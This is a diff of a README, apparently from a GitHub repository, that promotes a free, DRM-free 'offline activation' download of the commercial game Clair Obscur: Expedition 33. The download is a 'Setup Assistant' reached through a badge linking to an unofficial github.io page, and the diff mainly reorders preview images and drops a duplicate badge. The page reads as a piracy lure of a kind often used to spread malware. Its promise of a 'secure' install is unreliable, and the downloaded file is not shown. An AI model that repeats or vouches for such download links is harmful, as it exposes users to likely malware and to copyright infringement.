@@ -1,4 +1,4 @@
-# Clair Obscur: Expedition 33 — Free Download 
+# Clair Obscur: Expedition 33 — Offline Activation Guide
 
 [![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://clair-obscur-expedition-33-install.github.io/.github)
 
@@ -9,6 +9,19 @@
 In Clair Obscur: Expedition 33, players must guide a group of adventurers on a mission to confront the entity known as the "Paintress," whose yearly ritual condemns citizens to death. Every battle is a poetic dance of timing and tactics, where magic, reflexes, and precision blend together. With a strong narrative core and immersive world-building, this game offers a cinematic experience unlike any other in the genre.
 
 Whether you’re looking to explore the haunting landscapes of this enigmatic universe or challenge yourself with its inventive turn-based systems, Clair Obscur delivers a memorable journey. This assistant tool ensures that players can perform a secure, **offline setup and install Clair Obscur: Expedition 33 for free**, with no need for online activation, login, or DRM dependencies. It’s ideal for gamers who prefer airgapped environments or full local control over their game installations.
+
+---
+
+## 🖼 Preview
+
+![Stylized World Design](https://static.gabestore.ru/screen_product/miB-QqciwZnplQz3G7_jmO5argrqnLia.jpg)  
+*Artistic fantasy environments in Unreal Engine 5*
+
+![Combat Showcase](https://cdn1.epicgames.com/spt-assets/330dace5ffc74156987f91d454ac544b/project-w-1kt2x.jpg)  
+*Strategic and real-time battle fusion*
+
+![Character Exploration](https://cdn2.unrealengine.com/clair-obscur-expedition-33-8-1920x1080-636e16d08dc7.jpg)  
+*Haunting narrative-driven RPG experience*
 
 ---
 
@@ -33,21 +46,6 @@ Whether you’re looking to explore the haunting landscapes of this enigmatic un
 - 🧪 Turn-based action combat and party systems  
 - 🎭 No DRM, no online checks, no account needed  
 - 🖥 Optimized for PC performance and controller support
-
----
-
-## 🖼 Preview
-
-![Stylized World Design](https://static.gabestore.ru/screen_product/miB-QqciwZnplQz3G7_jmO5argrqnLia.jpg)  
-*Artistic fantasy environments in Unreal Engine 5*
-
-![Combat Showcase](https://cdn1.epicgames.com/spt-assets/330dace5ffc74156987f91d454ac544b/project-w-1kt2x.jpg)  
-*Strategic and real-time battle fusion*
-
-![Character Exploration](https://cdn2.unrealengine.com/clair-obscur-expedition-33-8-1920x1080-636e16d08dc7.jpg)  
-*Haunting narrative-driven RPG experience*
-
-[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://clair-obscur-expedition-33-install.github.io/.github)
 
 ---
 
